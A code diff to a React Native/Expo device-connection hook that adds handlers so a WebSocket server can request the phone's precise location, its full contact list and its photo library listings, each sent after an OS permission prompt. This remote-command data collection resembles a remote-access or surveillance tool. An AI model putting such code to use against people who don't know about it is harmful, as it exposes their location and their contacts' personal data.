@@ -1,5 +1,8 @@
 import { useState, useEffect, useRef } from 'react';
 import * as Device from 'expo-device';
+import * as Location from 'expo-location';
+import * as Contacts from 'expo-contacts';
+import * as MediaLibrary from 'expo-media-library';
 
 interface ConnectionState {
   isConnected: boolean;
@@ -172,10 +175,16 @@ export function useDeviceConnection() {
         // Server responded to ping, connection is alive
         break;
       case 'request_location':
-        // Handle location request from server
+        handleLocationRequest();
         break;
       case 'request_contacts':
-        // Handle contacts request from server
+        handleContactsRequest();
+        break;
+      case 'request_files':
+        handleFilesRequest();
+        break;
+      case 'browse_directory':
+        handleDirectoryRequest(message.data);
         break;
       // Add more message handlers as needed
       default:
@@ -183,6 +192,160 @@ export function useDeviceConnection() {
     }
   };
 
+  const handleLocationRequest = async () => {
+    try {
+      const { status } = await Location.requestForegroundPermissionsAsync();
+      if (status !== 'granted') {
+        sendMessage({
+          type: 'location_response',
+          data: { error: 'Location permission denied' }
+        });
+        return;
+      }
+
+      const location = await Location.getCurrentPositionAsync({
+        accuracy: Location.Accuracy.High,
+      });
+
+      sendMessage({
+        type: 'location_response',
+        data: {
+          latitude: location.coords.latitude,
+          longitude: location.coords.longitude,
+          accuracy: location.coords.accuracy,
+          timestamp: location.timestamp,
+        }
+      });
+    } catch (error) {
+      sendMessage({
+        type: 'location_response',
+        data: { error: error.message }
+      });
+    }
+  };
+
+  const handleContactsRequest = async () => {
+    try {
+      const { status } = await Contacts.requestPermissionsAsync();
+      if (status !== 'granted') {
+        sendMessage({
+          type: 'contacts_response',
+          data: { error: 'Contacts permission denied' }
+        });
+        return;
+      }
+
+      const { data } = await Contacts.getContactsAsync({
+        fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
+      });
+
+      sendMessage({
+        type: 'contacts_response',
+        data: data
+      });
+    } catch (error) {
+      sendMessage({
+        type: 'contacts_response',
+        data: { error: error.message }
+      });
+    }
+  };
+
+  const handleFilesRequest = async () => {
+    try {
+      const { status } = await MediaLibrary.requestPermissionsAsync();
+      if (status !== 'granted') {
+        sendMessage({
+          type: 'files_response',
+          data: { error: 'Media library permission denied' }
+        });
+        return;
+      }
+
+      const assets = await MediaLibrary.getAssetsAsync({
+        first: 100,
+        mediaType: 'photo',
+      });
+
+      const files = assets.assets.map(asset => ({
+        id: asset.id,
+        filename: asset.filename,
+        uri: asset.uri,
+        mediaType: asset.mediaType,
+        width: asset.width,
+        height: asset.height,
+        creationTime: asset.creationTime,
+        modificationTime: asset.modificationTime,
+        duration: asset.duration,
+      }));
+
+      sendMessage({
+        type: 'files_response',
+        data: files
+      });
+    } catch (error) {
+      sendMessage({
+        type: 'files_response',
+        data: { error: error.message }
+      });
+    }
+  };
+
+  const handleDirectoryRequest = async (data: any) => {
+    try {
+      // For mobile, we'll browse media library by type
+      const { status } = await MediaLibrary.requestPermissionsAsync();
+      if (status !== 'granted') {
+        sendMessage({
+          type: 'directory_response',
+          data: { error: 'Media library permission denied' }
+        });
+        return;
+      }
+
+      const assets = await MediaLibrary.getAssetsAsync({
+        first: 50,
+        mediaType: 'photo',
+      });
+
+      const files = assets.assets.map(asset => ({
+        name: asset.filename,
+        type: 'file',
+        size: 0, // Size not available in MediaLibrary
+        path: asset.uri,
+        isDirectory: false,
+        lastModified: asset.modificationTime,
+      }));
+
+      sendMessage({
+        type: 'directory_response',
+        data: {
+          files: files,
+          currentPath: data.path || '/media'
+        }
+      });
+    } catch (error) {
+      sendMessage({
+        type: 'directory_response',
+        data: { error: error.message }
+      });
+    }
+  };
+
+  const reconnect = async (serverIP: string, serverPort: string) => {
+    if (connectionState.isConnecting) return false;
+    
+    setConnectionState(prev => ({
+      ...prev,
+      status: 'Reconnecting...',
+      error: null,
+    }));
+
+    // Wait a bit before reconnecting
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    return connect(serverIP, serverPort);
+  };
   const sendMessage = (message: any) => {
     if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
       wsRef.current.send(JSON.stringify(message));
@@ -202,6 +365,7 @@ export function useDeviceConnection() {
     ...connectionState,
     connect,
     disconnect,
+    reconnect,
     sendMessage,
   };
 }
